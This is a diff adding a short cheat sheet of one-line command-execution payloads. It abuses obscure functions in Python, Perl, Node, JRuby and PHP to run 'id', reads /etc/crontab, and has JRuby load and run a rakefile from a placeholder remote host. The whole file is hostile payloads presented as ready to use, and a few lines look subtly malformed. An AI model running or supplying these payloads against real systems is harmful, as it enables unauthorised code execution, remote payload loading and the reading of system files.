@@ -1,0 +1,17 @@
+python:
+python -c "import mimetools;print(mimetools.pipeto(None,'id'))"
+python -c "import pydoc;print(pydoc.pipepager(None,'id'))" 
+
+perl:
+perl -e "use ExtUtils::Typemaps::Cmd;print embeddable_typemap(\"system 'id'\")"
+
+NodeJS
+node -e "console.log(require('/etc/crontab'))"
+
+Ruby
+(JRuby v1.7.27)
+http://x.x.x.x/canaryfile ->>> puts %x(id)
+jruby -e 'require "rake";putsRake.load_rakefile("http://x.x.x.x/canaryfile")'
+
+PHP:
+php -r 'echo shell_exec(escapeshellcmd(bash." -c id"));'
